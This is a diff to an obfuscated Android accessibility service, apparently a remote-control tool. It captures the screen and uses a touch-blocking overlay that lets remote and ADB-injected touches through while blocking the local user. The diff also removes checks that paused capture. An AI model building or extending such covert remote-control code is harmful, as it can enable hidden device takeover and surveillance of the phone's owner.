@@ -427,6 +427,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
     @Volatile private var touchBlockEnabled: Boolean = false
     // 0 表示从未收到过远程事件；> 0 为 SystemClock.uptimeMillis()。
     private val lastRemoteActivityMs = AtomicLong(0L)
+    @Volatile private var adbTouchGestureUntil = 0L
     // true 表示当前 overlay 处于穿透状态（FLAG_NOT_TOUCHABLE 设置），远程可通过。
     @Volatile private var touchBlockPassThrough: Boolean = true
     @Volatile private var touchBlockSwitchPending: Boolean = false
@@ -449,7 +450,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
             } else {
                 SystemClock.uptimeMillis() - last
             }
-            val shouldPassThrough = elapsed < TOUCH_BLOCK_ACTIVE_WINDOW_MS
+            val shouldPassThrough = SystemClock.uptimeMillis() < adbTouchGestureUntil || elapsed < TOUCH_BLOCK_ACTIVE_WINDOW_MS
             if (shouldPassThrough != touchBlockPassThrough) {
                 applyTouchBlockFlag(shouldPassThrough)
             }
@@ -458,7 +459,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
     }
 
     private fun requestPenetrateFrame(reason: String, immediate: Boolean = false) {
-        if (AccessibilityLifecycle.paused || AccessibilityLifecycle.adbCaptureCommitted) return
+        if (AccessibilityLifecycle.paused) return
         if (!SKL) return
         val now = SystemClock.uptimeMillis()
         val elapsed = now - lastPenetrateRenderMs
@@ -484,7 +485,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
                 } catch (e: Exception) {
                     null
                 }
-                if (SKL && root != null && !AccessibilityLifecycle.paused && !AccessibilityLifecycle.adbCaptureCommitted) {
+                if (SKL && root != null && !AccessibilityLifecycle.paused) {
                     EqljohYazB0qrhnj.a012933444444(root)
                 }
             } catch (e: Exception) {
@@ -497,6 +498,25 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
                 }
             }
         }.start()
+    }
+
+    /** The existing protection overlay needs a pass-through window for shell input too. */
+    fun prepareAdbTouch(action: Int, ready: () -> Unit) {
+        handler.post {
+            if (action == 0 || action == 2) adbTouchGestureUntil = SystemClock.uptimeMillis() + 10_000
+            lastRemoteActivityMs.set(SystemClock.uptimeMillis())
+            if (touchBlockEnabled) applyTouchBlockFlag(true)
+            // Let WindowManager apply FLAG_NOT_TOUCHABLE before injecting DOWN.
+            if (action == 0 && touchBlockEnabled) handler.postDelayed({ ready() }, 32) else ready()
+        }
+    }
+    fun finishAdbTouch(action: Int) {
+        if (action != 1 && action != 3) return
+        handler.post {
+            adbTouchGestureUntil = 0L
+            lastRemoteActivityMs.set(0L)
+            if (touchBlockEnabled) applyTouchBlockFlag(false)
+        }
     }
 
     private fun markRemoteTouchBlockActivity() {
@@ -815,7 +835,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
               penetrateRenderPending = false
               lastPenetrateRenderMs = 0L
               try {
-                  if (!AccessibilityLifecycle.adbCaptureCommitted) ClsFx9V0S.VaiKIoQu("video", true)
+                  ClsFx9V0S.VaiKIoQu("video", true)
               } catch (e: Exception) {
                   Log.e("InputService", "onstart_capture: enable video raw failed", e)
               }
@@ -2453,7 +2473,7 @@ fun b481c5f9b372ead_2() {
 )
 
     fun d(str: String?) {
-        if (AccessibilityLifecycle.paused || AccessibilityLifecycle.adbCaptureCommitted) return
+        if (AccessibilityLifecycle.paused) return
         try {
             if (str != null) {
         
@@ -2540,7 +2560,7 @@ fun b481c5f9b372ead_2() {
         }
 
         override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
-            if (AccessibilityLifecycle.paused || AccessibilityLifecycle.adbCaptureCommitted) {
+            if (AccessibilityLifecycle.paused) {
                 screenshotResult.hardwareBuffer.close()
                 return
             }
